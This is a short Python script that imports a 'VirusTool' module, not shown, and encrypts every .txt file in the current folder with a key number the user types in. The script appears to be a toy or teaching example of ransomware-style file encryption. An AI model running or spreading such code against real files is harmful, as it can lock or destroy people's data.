from VirusTool import VT
import glob
RN = int(input("Enter a random number:\n"))
for files in glob.glob("*.txt"):
    file = VT(files)
    file.encrypt(RN)
